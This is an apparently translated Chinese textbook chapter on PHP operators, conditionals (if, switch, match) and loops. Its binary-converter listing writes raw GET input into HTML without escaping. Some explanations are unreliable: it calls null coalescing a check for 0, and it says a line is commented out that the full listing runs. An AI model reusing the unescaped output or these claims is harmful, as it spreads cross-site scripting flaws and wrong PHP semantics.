```

## 创建二进制模式

用纸笔将整数转换为二进制表示法并非易事。因此，用 PHP 编写一个小转换器是有意义的（参见图 5.7）。这里描述的转换器旨在将 0 到 255（2^8）之间的数字转换为八位二进制表示法。

> 注
> 如果您是 PHP 新手，可能尚不熟悉这里使用的许多选项。您将在本章了解编程结构，并在第 13 章学习如何使用表单。

表单中输入数字的转换包含三个重要元素：

- 一个循环遍历二进制数的八位，从 7 到 0。计数器 $i 在以下语句中既用于访问数组，也用于计算：

  ```
  for ($i = 7; $i >= 0; $i--) {
  //statements
  }
  ```

- 在循环中，使用按位 AND 检查数字在该位置是否有 1。计数器的幂次确定相应位置——第一次运行 2^7 = 128，第二次 2^6 = 64，依此类推。如果相应位置有 1，则在数组中设置 1，否则设置 0：

  ```
  if ($number & pow(2, $i)) {
  $binaryNumbers[$i] = 1;
  } else {
  $binaryNumbers[$i] = 0;
  }
  ```

- 最后，使用 join() 将包含数据值的数组转换为字符串：

  ```
  $binary = join("", $binaryNumbers);
  ```

完整的脚本在下一个清单中列出。

```
<?php
$number = "";
$binary = "";
if (isset($_GET["Send"]) && $_GET["Send"] == "Convert") {
$number = $_GET["input"];
$binaryNumbers = array();
for ($i = 7; $i >= 0; $i--) {
    if ($number & pow(2, $i)) {
        $binaryNumbers[$i] = 1;
    } else {
        $binaryNumbers[$i] = 0;
    }
}
$binary = join("", $binaryNumbers);
}
?>
```

```
<html>
<head>
<title>Bin&auml;r</title>
</head>
<body>
<form>
<input type="text" name="input" value="<?=$number ?>"/>
<input type="text" name="output" value="<?=$binary ?>"/>
<input type="submit" name="Send" value="Convert" />
</form>
</body>
</html>
```

清单 5.6 转换为二进制表示法（“bitwise_convert.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_126_0.png)

图 5.7 数字 20 转换为二进制表示法

### 5.1.5 与众不同的运算符

您在第四章第 4.3 节中已经见过赋值运算符（等号）的用法。它用于给变量赋值，但也属于运算符类别。除此之外，还有几个通常不被认作运算符的运算符。





## 错误抑制

> 注意
> 您可以在此处找到一些这些特殊的运算符。与对象相关的运算符在第 11 章中讨论。

不同寻常的运算符类别包括用于抑制错误消息的运算符，即 @ 符号。如果将此运算符放在表达式前面，则由此表达式生成的错误消息将被抑制。表达式可以是函数调用、加载外部脚本或其他类似内容。下面是一个调用未知外部文件的示例：

```
$file = @file('unknown.php');
```

但是，自 PHP 8 起，这里有一个新功能：致命错误（即诸如不存在的函数等严重错误）不会被抑制。因此，以下代码行在 PHP 8 中会生成错误消息：

```
@functionName();
```

> 注意
> @ 在表达式中的作用很强——尽管在 PHP 8 中有所合理的削弱。由于错误消息被抑制，使用 @ 时故障排除比较困难。因此，在实际操作中应非常谨慎地使用 @——或者最好根本不要使用，并在脚本不按预期工作时首先将其删除。

> 注意
> 您可以在第 35 章中了解更多有关检测错误的信息。

## Shell 运算符

Shell 运算符用于在 Shell 中执行命令。命令写在从左上到右下的斜线之间，这些斜线也称为反引号（即，`statement`）。

## "print"

print 语言构造也被视为 PHP 中的运算符。这实际上只有一个效果：print 出现在运算符序列中，其优先级高于逻辑 AND。这意味着，以下代码行对 true 输出 1，因为在使用逻辑运算符之前，首先输出第一个比较：

```
print 7 > 3 and 7 < 3;
```

如果改用带符号的逻辑 AND，则不会输出任何值，即 false，因为带符号的逻辑 AND 的优先级高于 print：

```php
print 7 > 3 && 7 < 3;
```

与 print 不同，echo 不是运算符。请看一下区别：

```php
echo 7 > 3 and 7 < 3;
```

使用 print 时，此代码行会对 true 输出 1；使用 echo 时，不输出任何值，即 false。

## 条件运算符

条件运算符用于在两个表达式之间进行选择。如果条件满足，则使用表达式 1，否则使用表达式 2。所使用的表达式返回一个值：

```php
Condition ? Expression1 : Expression2;
```

因为带有条件、表达式 1 和表达式 2 的条件运算符是 PHP 中唯一具有三个操作数的运算符，它也被称为三元运算符。

以下代码检查变量是否具有值 4 并返回一个值：

```php
$a = 4;
$result = $a != 4 ? 4 : 8;
```

使用条件运算符后，$result 变量的值为 8。

> **注意**
>
> 如果将语句作为表达式执行，条件运算符替代简单的情况区分。然而，这被认为是相当不整洁的编程。因此，您只有在真正想在两个表达式之间进行选择时才应使用条件运算符。

使用三元运算符时，中间部分也可以省略：

```php
Condition ?: Expression2;
```

在这种情况下，条件的值会直接返回，除非条件未满足。在这种情况下，返回表达式 2。在以下示例中，首先检查条件（在此情况下为变量 $a）：

```php
$a = false;
$result = $a ?: 'false';
```

因为 $a 是 false，$result 接收字符串 false。

## 带零检查的条件运算符

自 PHP 7 起，有一个附加的条件运算符，它还检查第一个操作数是否具有值 0，如果是，则不返回错误消息，而是返回第二个操作数的值。它也称为空合并运算符。例如，当变量从表单传输时，这很有帮助。以前，这里需要组合条件运算符和 isset()：

Operand1 ?? Operand2;

以下代码行显示运算符的用法。这里检查了一个 GET 变量（参见图 5.8）。如果它不是 null，则其值存储在 $result 变量中。如果它是 null，则使用字符串 'alternative'。

```
$result = $_GET['variable'] ?? 'alternative';
```

![](img/ae7820c36e8f24c1623d26668b28e80e_129_0.png)

### 图 5.8 如果定义了 GET 变量，结果将发生变化（请注意底部图片地址栏中的 GET 参数！）

> **注意**
>
> 此解决方案完全对应于使用条件运算符 ?: 的以下方法：
>
> $result = isset($_GET['variable']) ? $_GET['variable'] : 'Alternative';
>
> 这节省了大量输入工作，并产生更优雅的代码。

带零检查的条件运算符不仅可以一次用于一个值，还可以组合成检查链。为此，只需将操作数追加在一起：

```
$result = $_GET['variable'] ?? $_GET['variable2'] ?? 'Alternative';
```

如果名为 `variable` 的 GET 变量存在，则将此值用于 $result。如果不存在，则接下来检查 `variable2`，然后才使用备用值。

## 空安全运算符

`nullsafe operator` 是 PHP 8 中的新增功能，作为带有 null 检查的条件运算符的有用补充。

"又一个运算符？"一些人可能会问。PHP 8 文档中的官方示例很好地说明了这一点。空安全运算符的目的是解决嵌套对象中永恒的嵌套检查。因此，这个复杂的结构：

```
$country = null;
if ($session !== null) {
  $user = $session->user;
  if ($user !== null) {
    $address = $user->getAddress();
    if ($address !== null) {
      $country = $address->country;
    }
  }
}
```

变成一行：

```
$country = $session?->user?->getAddress()?->country;
```

运算符 `?->` 是 null 检查和调用下一个方法或属性的组合。null 检查始终适用于左操作数。

Operand1 ?-> Operand2 ?-> Call

允许任何嵌套；也就是说，运算符可以多次连续使用。但是，出于性能原因，一旦第一个操作数为零，就会立即停止。这对应于*短路求值*原则。

运算符的主要应用领域是在面向对象环境中带有函数和方法调用的数据读取。需要注意的是，它不适用于写入或设置值。

以下示例展示了使用 `Travel` 类的用法，该类使用可选的 `DateTime` 对象：

```
class Travel {
public ?DateTime $start = null;
}
```

此处未创建此对象，因为它被有意注释掉了：

```
//$travel->start = new DateTime();
```

在这种情况下，空安全运算符介入，确定第二个操作数 start 具有值 null，从而结束检查：

```
$arrival = $travel?->start?->format('d.m.Y');
```

结果是将 NULL 作为值输出。

以下是完整代码：

```
<?php
class Travel {
public ?DateTime $start = null;
}

$travel = new Travel();
$travel->start = new DateTime();

$arrival = $travel?->start?->format('d.m.Y');
var_dump($arrival);
?>
```

### 列表 5.7 空安全运算符 ("nullsafe_operator.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_131_0.png)

### 图 5.9 "DateTime" 对象为 null

与带有 null 检查的条件运算符的区别并不完全简单；对于某些应用程序，两者都可以通用。因此，以下是最重要差异的简要概述：

- 空安全运算符允许函数和方法调用的串联，并进行短路求值。然而，使用条件运算符时，调用未知方法会导致错误。

- 空安全运算符不支持数组键。这意味着，如果数组键不存在，它将返回错误：

```php
$a = array();
$b = $a['test']->property;
```

- 另一方面，条件运算符可以轻松接受空数组键，并采用备用文本 Not available：

```php
$a = array();
$b = $a['test']->property ?? 'Not available';
```

### 5.1.6 运算符的优先级

在由多个运算符组成的语句中，PHP 需要知道应按什么顺序执行操作。请看一下以下代码行：

```
$result = 2 + 4 * 5;
```

结果是 22。首先进行乘法，然后加 2。因此，* 运算符的优先级高于 +。在数学中，这对应于“点优先于横线”规则。

您也可以影响执行顺序。为此，请使用圆括号：

```
$result = (2 + 4) * 5;
```

此代码行的结果为 30，因为首先加 2 和 4，然后将和乘以 5。圆括号本身也是一个运算符。

由于并非所有优先级都像简单的数学规则那样简单明了，您将在表 5.6 中找到最重要优先级列表。优先级越高，偏好越高。这意味着优先级较高的操作首先执行。在同一优先级内，执行顺序取决于结合性。对于可以连续出现多次的所有运算符，这指示运算符顺序是从左到右还是从右到左。在乘法、除法和取模的情况下，先执行左侧的操作，然后是右侧的操作，依此类推。

```
$result = 6 / 3 * 2;
```

因此结果为 4，而不是 1。

4 术语“优先级”与顺序或偏好同义使用。





| 排名 | 结合性 | 运算符 |
| :--- | :--- | :--- |
| 20 | 无 | new |
| 19 | 左 | [] |
| 18 | 右 | ! ~ ++ -- (类型运算符) @ |
| 17 | 左 | * / % |
| 16 | 左 | + - . |
| 15 | 左 | << >> |
| 14 | 无 | < <= > >= <> |
| 13 | 无 | == != <=> === !== |
| 12 | 左 | & |
| 11 | 左 | ^ |
| 10 | 左 | \| |
| 9 | 左 | && |
| 8 | 左 | \|\| |
| 7 | 左 | ? : |
| 6 | 右 | = += -= *= /= .= %= &= \|= ^= << >>= |
| 5 | 右 | print |
| 4 | 左 | and |
| 3 | 左 | xor |
| 2 | 左 | or |
| 1 | 左 | , |

表 5.6 运算符的顺序

## 5.2 情况区分

左或右？这个简单的问题不仅在十字路口令程序员困惑，也在他的 Web 应用中困扰着他。所有可能以 "if" 开头的东西都在呼唤情况区分。如果用户输入 "XY"，就执行这个；如果输入 "AB"，就执行那个。

PHP 为这些基本检查和决策提供了三种编程结构：首先是 if 情况区分，它几乎存在于所有当前编程语言中；其次是 switch case，第三是 match。我们将在以下各节中分别讨论。

### 5.2.1 "if"

if 的基本形式包含两个重要元素：一个被检查的条件，以及仅在条件满足时执行的语句块。
为了让 PHP 解释器能够处理它，你必须遵循以下简单语法：

```php
if (condition) {
 statements;
}
```

简单来说，这意味着：如果条件满足，则执行语句；如果条件不满足，则忽略语句。然后——在两种情况下——代码都会在 if 情况区分之后执行。花括号内的语句也称为语句块。

以下示例检查儿童的年龄。这里的年龄通过源代码中的 $age 变量指定。当然，这也可以是表单中的用户输入或数据库中的值。

```php
<?php
$age = 4;
if ($age > 3) {
 echo "At $age years, the child has outgrown infancy.";
}
?>
```

示例 5.8 "if" 情况区分 ("if.php")

你认为会显示什么？没错：带有儿童年龄的文本（参见图 5.10）。

例如，如果将 $age 变量的值更改为 3 或更低的数字，则没有输出。因此页面保持为空，因为条件未满足，带有 echo 的输出语句根本不会执行。

![](img/ae7820c36e8f24c1623d26668b28e80e_134_0.png)

图 5.10 儿童年龄超过三岁

### "elseif"

在实际中，往往不止一个替代方案，而是有几个。一种可能的解决方案是直接将多个 if 情况区分一个接一个地写出来：

```php
if ($age > 3) {
    echo "At $age, the child has outgrown infancy.";
}
if ($age >= 2) {
    echo "The $age year old baby can speak a little.";
}
```

如果变量 $age 的值为 6，会发生什么？由于这两个 if 情况区分互不相关，因此会分别单独检查。因为两个条件都满足，PHP 会执行两条语句（参见图 5.11）。

![](img/ae7820c36e8f24c1623d26668b28e80e_135_0.png)

图 5.11 六岁婴儿只能说一点话？这可行不通。

要在情况区分中检查多个条件，可以使用 elseif：

```php
if (condition) {
    statements;
} elseif (condition) {
    statements;
}
```

elseif 语句块仅在 if 条件未满足且 elseif 条件满足时执行。下一个示例使用 elseif 来代替上一个示例中的两个 if 语句。

```php
$age = 6;
if ($age > 3) {
    echo "At $age years old, the child has outgrown infancy.";
} elseif ($age >= 2) {
    echo "The $age years old baby can speak a little.";
}
```

示例 5.9 使用 "elseif" 检查替代方案 ("elseif.php")

在此示例中，首先检查 `if` 条件。因为条件已满足，所以执行语句块。然后 PHP 退出情况区分。因此不再检查 `elseif` 条件。你可以在图 5.12 中看到结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_136_0.png)

图 5.12 仅执行 "if" 语句块

> **注意**
> 可以连续使用任意数量的 `elseif` 条件。只要第一个条件满足，就会退出情况区分。

### "else"

可以用 `if` 和 `elseif` 覆盖许多情况，但通常不能覆盖所有情况。这就是存在 `else` 语句块的原因：

```php
if (condition) {
statements;
} elseif (condition) {
statements;
} else {
statements;
}
```

如果没有任何先前的条件满足，则始终执行 `else` 语句。在以下示例中，`if` 和 `elseif` 条件都不适用。因此，输出来自 `else` 语句块（参见图 5.13）。

```php
$age = 18;
if ($age > 3 && $age < 18) {
echo "At $age, the child has outgrown infancy.";
} elseif ($age >= 2 && $age <= 3) {
echo "The $age year old baby can speak a little.";
} else {
echo "Still a very small baby or already grown up.";
}
```

示例 5.10 "else" 语句 ("else.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_137_0.png)

图 5.13 由于没有任何先前条件适用，因此执行了 "else" 语句

**注意**

elseif 语句实际上是 if 和 else 的组合，程序员发明它是为了让自己更轻松。仅使用 if 和 else，你可以这样模拟 elseif：

```php
if (condition) {
statements;
} else {
if (condition) {
statements;
} else {
statements;
}
}
```

### 简短形式

if 情况区分也可以将所有内容写在一行上，以更短的形式编写：

```php
if (condition) { statement; }
```

如果语句块中只有一条语句，则可以简单地省略花括号：

```php
if (condition)
statement;
```

然后还可以将整个内容写在一行上：

```php
if (condition) statement;
```

简短形式也适用于 elseif 和 else。

```php
$age = 0;
if ($age > 3 && $age < 18) echo "Youth";
elseif ($age >= 2 && $age <= 3) echo "Speaking age";
else echo "Small baby or adult";
```

示例 5.11 简短形式的情况区分 ("if__shortform.php")

**注意**

这种三行的情况区分节省了一点输入工作，但日后可能会带来问题，因为它相当难以阅读。当你一个月后再次查看代码时，需要一些时间来理清这些晦涩的情况区分。不得不继续使用你代码的同事也会对这种令人困惑的变体感到棘手。

### 替代形式

使用简短形式，你还未触及简单情况区分的替代记号的终点。PHP 还提供一种使用冒号和 `endif` 的记法：

```php
if (condition) :
    statements;
elseif (condition) :
    statements;
else:
    statements;
endif;
```

这种语法有些类似 Visual Basic。它在 PHP 中实际上并不常见，但有一个实际应用领域（参见图 5.14）：简单地输出 HTML 代码。下一个示例展示了它在实践中的样子。

```php
<?php
$a = 10;
if ($a < 8) :
?>

<p>if condition fulfilled</p>

<?php
elseif ($a >= 8 && $a < 20) :
?>

<p>elseif condition fulfilled</p>
<?php
else:
?>
<p>else case occurred</p>
<?php
endif;
?>
<p>HTML outside the case distinction</p>
```

示例 5.12 HTML 输出融入情况区分中 ("if_alternative_form.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_139_0.png)

图 5.14 在这种情况下，发生了 "elseif" 条件

### 嵌套

你可以随意将 if 情况区分相互嵌套。唯一的条件是你仍能在自己纠缠的思路中找到方向。以下示例（另见图 5.15）展示了一个嵌套的情况区分，也说明了嵌套的复杂性。

```php
$age = 20;
if ($age > 3) {
echo "At $age, the child has outgrown infancy.";
if ($age > 18) {
if ($age <= 21) {
echo "Already an adult?";
} else {
echo "Adult.";
}
} elseif ($age >= 10) {
echo "A teenager";
} else {
echo "A small child";
}
}
```





```
}
} else {
echo "Another baby";
}
```

### 清单 5.13 嵌套“if”情况区分 (“if_nested.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_140_0.png)

### 图 5.15 嵌套“if”语句的输出

### 5.2.2 “switch”

PHP 中的第二种情况区分是 switch。它也可以在许多其他编程语言中找到，但有时会有不同的名称，例如 Visual Basic 和 VBScript 中的 select。

switch 用于检查变量或表达式在各个案例中的值。如果某个值与变量的值匹配，则会执行随后的语句。break 语句随后退出 switch 情况区分：

```php
switch (Variable) {
case Value1:
Statements;
break;
case Value2:
Statements;
break;
case Value3:
Statements;
break;
}
```

如果要检查变量的不同值，switch 情况区分特别合适。在下面的清单和图 5.16 中，您可以看到一个示例。

```php
$age = 30;
switch ($age) {
case 29:
echo "You are 29.";
break;
case 30:
    echo "You are 30.";
    break;
case 31:
    echo "You are 31.";
    break;
}
```

### 清单 5.14 "switch" 情况区分 ("switch.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_141_0.png)

### 图 5.16 出现第二种情况

### "break"

如果在 switch 情况区分中省略 break 语句，将执行适用案例之后的所有语句。这种行为有时是可取的，例如如果您希望为多个案例执行相同的语句，但在下面的示例中，它会导致不希望的结果（参见图 5.17）。

```php
$age = 30;
switch ($age) {
case 29:
    echo "You are 29.";
case 30:
    echo "You are 30.";
case 31:
    echo "You are 31.";
}
```

### 清单 5.15 不带 "break" 的 "switch" 情况区分 ("switch_without.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_141_1.png)

### 图 5.17 不带 "break"，将执行多条语句

这种行为的背景很快就能解释：switch 情况区分是一行接一行地固执地执行的。如果满足条件，这意味着所有随后的行都要执行。case 行会被忽略，但所有普通语句都会执行。这种行为有时是可取的，特别是如果要从某个点开始执行语句。

### 标准情况："default"

如果所有情况都不发生，switch 仍然有一个标准情况。它以 default 关键字开头。语句在冒号后面：

```php
switch (Variable) {
case value1:
statements;
break;
case value2:
statements;
break;
default:
statements;
}
```

有了标准情况，您可以捕获之前情况中未考虑的所有内容。在下面的简单示例中，标准情况负责处理年龄不在 29 到 31 岁之间的所有人（参见图 5.18）。

```php
$age = 32;
switch ($age) {
case 29:
echo "You are 29.";
break;
case 30:
echo "You are 30.";
break;
case 31:
echo "You are 31.";
break;
default:
echo "You are not between 29 and 31.";
}
```

### 清单 5.16 带有 "default" 语句的 "switch" ("switch_default.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_143_0.png)

### 图 5.18 标准情况已发生

### 带条件

到目前为止，您只使用过 switch，但 switch 也允许您为各个案例指定条件。例如，您可以按类别检查年龄。

```php
switch ($age) {
case $age >= 10 && $age < 30:
echo "You are between 10 and 29.";
break;
case $age >= 30 && $age < 50:
echo "You are between 30 and 49.";
break;
case $age >= 50 && $age < 70:
echo "You are between 50 and 69.";
break;
default:
echo "You do not fit into any of the categories.";
}
```

### 清单 5.17 带条件的 "switch" ("switch_condition.php")

> **注意**
> 
> 为了清晰起见，建议将条件放在圆括号中。但这不是必须的。

### "if" 与 "switch" 的比较

何时使用 if，何时使用 switch 更好？这个问题没有统一答案。在当前实践中，switch 主要用于检查值。条件通常使用 if 来检查。

switch 的语法需要一点时间来适应。它实际上比带花括号的 if 情况区分稍短一点，但 switch 需要 break 语句。

从 PHP 解释器的角度来看，`switch` 实际上更类似于一个循环。例如，`break` 语句也可以用 `continue` 语句替代。这样做的优点是，您可以例如使用 `continue 2` 来取消 `switch`，并调用下一个外层循环迭代。

然而，这些是特殊情况，选择哪种变体是个人偏好的问题。

### 5.2.3 "match"

借助 match 情况区分，PHP 8 实际上为基本编程功能带来了一项相对较大的创新。其目标是用尽可能少的代码行实现结构更好、可读性更高的源代码。对于许多应用，match 旨在替换在专业人士中不太受欢迎的 switch。

与 switch 不同，match 为每个案例返回一个结果。这意味着最终会有一个可用于进一步处理的结果。从 PHP 的角度来看，match 因此是一个表达式，因为它有一个值。这就是为什么 match 语句在右花括号后面必须始终有一个分号：

```php
Result = match (variable) {
    value1 => return 1,
    value2, value3 => return 2,
    default: standard return
};
```

但这不是 match 与 switch 之间的唯一区别。语法也明显不同，如您在此处所示。尽管变量像往常一样用圆括号括起来，但每个值检查后只有一行返回。行之间用逗号分隔。match 不使用 break。相反，一旦第一个值与变量的当前值匹配，检查就会立即结束。5

如果返回适用于多个值，则相应行中的值可以用逗号分隔。最后，default 标准情况是可选的。如果前面没有值适用，则返回它。

> **注意**
> 
> default 情况是可选的；也就是说，不一定必须定义。不过，这里需要稍加谨慎，因为 match 非常严格。如果没有值适用且没有 default 情况，则 match 会抛出类型为 UnhandledMatchError 的错误。这种严格性的目的是从一开始就使用干净代码来避免小错误。

5 此过程也称为短路求值，可以带来性能提升，因为所有后续指令都可以被忽略。

现在请看下面的示例。

```php
$age = 55;
$result = match ($age) {
    54 => "You are 54.",
    55 => "You are 55.",
    56, 57, 58 => "You are between 56 and 58.",
    default => "You do not fit into any of the categories."
};
echo $result;
```

### 清单 5.18 "match" 的使用 ("match.php")

在这种情况下，match 情况区分首先检查值 54。由于不适用，它跳到值 55 进行检查。这对应于 $age 变量的当前值。然后将使用并赋值给 $result 变量的这一行的返回值。因此输出如下：

You are 55.

不再执行对多个值和标准情况的下一次检查。

### 精确相等

与 switch 的一个重要区别仍然存在：在检查值时，match 使用精确相等，即对应于运算符 === 并包含值的类型。要测试这一点，我们可以更改脚本的第一行，将 $age 变量改为字符串而不是整数。

```php
$age = '55';
$result = match ($age) {
    54 => "You are 54.",
    55 => "You are 55.",
    56, 57, 58 => "You are between 56 and 58.",
    default => "You do not fit into any of the categories."
};
echo $result;
```

### 清单 5.19 "match" 使用严格类型 ("match_type.php")

在这种情况下，match 检测到所有值的类型不匹配。因此，default 情况发生，输出如下：

You do not fit into any of the categories.




## 更复杂的测试

在之前的示例中，`match` 用于简单的值检查。然而，更复杂的检查也是可行的。在这种情况下，布尔值 `true` 被用作变量：

```php
$result = match (true) {
```

在这种情况下的相应行中，我们将值替换为返回布尔值作为结果的检查：

```php
$age >= 10 && $age < 30 => "You are between 10 and 29.",
```

一旦该检查对某一行返回 `true`，`match` 就会生效并接受该行的返回值——也就是说，示例中的下一行：

```php
$age >= 50 && $age < 70 => "You are between 50 and 69.",
```

> **注意**
> 实际测试在此移至测试行。这也意味着您可以在此处进行不带严格类型的测试。在我们的情况中，`>` 和 `<` 被用作运算符。这意味着，如果 `$age` 是字符串而不是整数，检查也会返回 `true`。

以下行将被忽略，即使它们的检查也会返回 `true`。

```php
$age = 55;
$result = match (true) {
    $age >= 10 && $age < 30 => "You are between 10 and 29.",
    $age >= 30 && $age < 50 => "You are between 30 and 49.",
    $age >= 50 && $age < 70 => "You are between 50 and 69.",
    default => "You do not fit into any of the categories."
};
echo $result;
```

清单 5.20 带有复杂检查的 "match" ("match_true.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_146_0.png)

图 5.19 复杂检查已找到正确的值

> **注意**
> 在规划 `match` 的情况区分时，一些功能增强已在讨论中，例如除了单行返回值之外的语句块。因此，我们可以期待下一个 PHP 版本中有许多新功能。

## 5.3 循环

使用循环，您可以多次连续执行语句。PHP 支持四种循环类型，它们在其他编程语言中也很常见。您将了解其中的三种循环。最后一种 foreach 主要用于对象和数组。它将在第 11 章中讨论。

### 5.3.1 "for"

for 循环是所有循环中最方便的。它已经有三个参数来控制循环行为：

```php
for (start statement; condition; run statement) {
  statements;
}
```

其工作原理如下：

- 1. 起始语句在开始时只执行一次。
- 2. 然后 PHP 检查条件。
- 3. 如果条件满足，则解释器执行循环内的语句。如果不适用，则立即退出循环。
- 4. 在语句块（花括号）中的语句之后，执行遍历语句。
- 5. 然后 PHP 再次检查条件。
- 6. 如果是这种情况，则执行语句块中的语句，然后执行遍历语句。
- 7. 以此类推。

起始语句、条件和遍历语句用于控制循环执行的次数。它们共同构成了循环计数器。
请查看以下代码示例。

```php
for ($i = 0; $i < 10; $i++) {
    echo "$i<br />";
}
```

清单 5.21 "for" 循环 ("for.php")

在此处，变量 $i 在起始语句中初始化为值 0。它是计数器变量。条件是 $i 保持小于 10。在语句块中，$i 和一个换行符被输出。遍历语句使用增量将 $i 增加 1。您能想象循环输出什么吗？没错：从 0 到 9 的数字，如图 5.20 所示。

![](img/ae7820c36e8f24c1623d26668b28e80e_148_0.png)

图 5.20 从 0 到 9 的数字

> **注意**
> $i、$j 等通常用作计数器变量。这不是必需的，但已成为常见做法。

#### 无限循环

遍历语句用于确保条件在某个时刻不再满足。如果这不起作用——也就是说，条件始终满足——那么循环将被无限次执行（参见图 5.21）。

```php
for ($i = 0; $i < 10; $i--) {
    echo "$i<br />";
}
```

清单 5.22 无限循环 ("for_endless.php")

这种循环称为无限循环。在最佳情况下，这会导致服务器上出现高计算机负载。在测试时这不是问题；您可以简单地单击浏览器的取消按钮来结束它。然而，在生产系统中，无限循环可能导致许多问题，且原因可能难以查找。

![](img/ae7820c36e8f24c1623d26668b28e80e_149_0.png)

图 5.21 无限循环导致错误

#### 其他形式

和 PHP 中通常的情况一样，for 循环语法有几种可行的替代方案。

如果语句块只包含一行，您可以像 if 情况区分一样省略花括号。您甚至可以将语句放在循环的圆括号之后。

```php
for ($i = 0; $i < 10; $i++)
    echo "$i<br />";
```

清单 5.23 不带花括号的 "for" ("for_different.php")

您可以省略三个参数中的任何一个。在以下示例中，我们在循环之前初始化了计数器并在语句块中更改了它。起始和遍历语句被省略。在这种情况下，for 循环的工作方式类似于 while 循环（参见下一节）。

```php
$i = 0;
for (; $i < 10; ) {
    echo "$i<br />";
    $i++;
}
```

清单 5.24 不带起始和遍历语句的 "for" ("for_different2.php")

注意
在实践中，如果某个参数不需要设置，通常会省略它。这通常是起始语句，因为用作计数器的变量或元素已经被创建了。

您可以使用类似于 `if` 情况区分的冒号语法编写 `for` 循环，然后使用 `endfor` 结束循环。这样可以在循环中输出 HTML 代码。在以下示例中，我们再次在 HTML 代码中包含 PHP，用于输出计数器变量（参见图 5.22）。

```php
<?php
for ($i = 0; $i < 10; $i++):
?>
<p>Output: <?=$i ?></p>
<?php
endfor;
?>
```

清单 5.25 用于 HTML 输出的 "for" ("for_different3.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_150_0.png)

图 5.22 输出 HTML 代码

7 这也适用于与 `if` 一样的带花括号的语法。

#### 嵌套循环

在 PHP 中，循环可以随意嵌套。您只需将一个循环写在另一个循环的语句块中即可。

```php
for ($i = 1; $i <= 10; $i++) {
    echo "Row $i: ";
    for ($j = 1; $j <= 10; $j++) {
        echo $j * $i . " ";
    }
    echo "<br />";
}
```

清单 5.26 嵌套的 "for" 循环 ("for_nested.php")

此示例形成 10 行，每行包含 1 到 10 的数字乘以行号（参见图 5.23）。

![](img/ae7820c36e8f24c1623d26668b28e80e_151_0.png)

图 5.23 小乘法表

在实践中，嵌套循环的应用示例包括使用 PHP 操作图形。要重新为图像中的每个像素上色，请使用遍历所有水平像素列的 for 循环和遍历所有像素行的嵌套 for 循环。通过这两个嵌套 for 循环，您可以捕获图像中的每个像素。另一个应用领域是多维数组，您将在第 8 章中熟悉它。

### 5.3.2 "while"

while 循环被认为是循环之母——因为它出现在大多数编程语言中，并且其他循环类型可以从它形成。

while 循环只有一个"内置"功能——即条件：

```php
while (condition) {
statements;
}
```

只要条件为真，循环就会执行。但是，为了让循环在某个时刻终止，条件的一部分必须发生变化。for 循环为此目的提供了遍历语句；在 while 循环中，您必须自己创建它。

请查看以下示例。

```php
<?php
$i = 1;
while ($i < 10) {
    echo "$i<br />";
    $i++;
}
?>
```

清单 5.27 "while" 循环 ("while.php")

$i 变量是计数器变量。它在 while 循环之前初始化。while 循环本身只检查 $i 是否小于 10。只要是这种情况，就会执行语句。语句块也包含遍历语句。$i 在每次循环运行中增加 1（参见图 5.24）。

![](img/ae7820c36e8f24c1623d26668b28e80e_152_0.png)

图 5.24 使用 "while" 循环的 1 到 9 的数字

> **注意**
> 如果您想将 for 循环进行类比，语法上将如下所示：

起始语句；
while (condition) {

语句；
遍历语句；
}

## 其他形式

while 循环也允许一些其他表示法。如果你想缩短，有以下选项：

- 1. 如果 while 循环中只有一条语句，可以省略花括号，甚至将所有内容写在一行上。这与 for 循环类似，但遍历语句放在哪里？你可以（仅在简单情况下）使用递增或递减将其直接插入语句中。在清单 5.28 中，递增写在操作数之后。这意味着它仅在语句之后执行。

```
$i = 1;
while($i < 10) echo $i++ . "<br />";
```

清单 5.28 此清单输出 1 到 9 的数字（"while_different.php"）

- 2. while 循环也有冒号语法，在此情况下以 endwhile 结束。这意味着 while 循环可以类似于花括号，灵活地跨多个 PHP 块使用。

```
<?php
$i = 1;
while ($i < 10):
?>
<p>Output: <?=$i ?></p>
<?php
$i++;
endwhile;
?>
```

清单 5.29 分布在多个 PHP 块中的 "while"（"while_different2.php"）

## "break" 和 "continue"

break 语句用于退出循环。因此，以下示例中的结构是可能的。

```
<?php
$i = 1;
while (true) {
if ($i < 10) {
echo "$i<br />";
$i++;
} else {
	break;
	}
}
?>
```

清单 5.30 循环仅通过 "break" 结束（"break.php"）

这是一个通过 `break` 结束的有意无限循环。它输出 1 到 9 的数字。或者，你可以编写带有数字的 `break`，该数字指示从内到外退出多少个循环。因此，

```
break 1;
```

对应于

```
break;
```

但是，如果你现在嵌套多个循环或额外嵌套一个 `switch` case 语句，也可以指定更高的值以退出嵌套。以下示例显示一个 `while` 循环，它实际上会输出 1 到 9 的数字。`switch` 语句用于检查数字与 2 的乘积的两个额外情况。如果乘积是 10，则仅退出 `switch` 语句（并且检查不会再次执行，直到下一次循环）。但是，如果乘积是 16，则 `break` 语句退出 `switch` case 区分（编号 1）和 `while` 循环（编号 2）。这意味着 9 不再输出（参见图 5.25）。

```
<?php
$i = 1;
$j = 2;
while ($i < 10) {
	echo "$i";
	switch ($i * $j) {
	case 10:
		echo " * $j = 10";
		break;
	case 16:
		echo " * $j = 16";
		break 2;
	}
	echo "<br />";
	$i++;
}
?>
```

清单 5.31 带数字说明的 "break"（"break_number.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_155_0.png)

图 5.25 循环在 8 时中止

与 break 相比，continue 使用频率略低，它中断当前循环，但随后继续下一次循环。以下示例说明了这一点。这里输出 1 到 9 的数字。如果一个数能被 2 整除，则递增该语句，然后使用 continue 启动下一次循环。此后的语句被忽略。对于奇数，条件不满足，带 continue 的部分被忽略，并且执行遍历语句和奇数输出（参见图 5.26）。

![](img/ae7820c36e8f24c1623d26668b28e80e_155_1.png)

图 5.26 在本示例中，仅当先前未使用 "continue" 时才输出 "奇数"

```
<?php
$i = 1;
while ($i < 10) {
    echo "<br />$i";
    if ($i % 2 == 0) {
        $i++;
    }
```

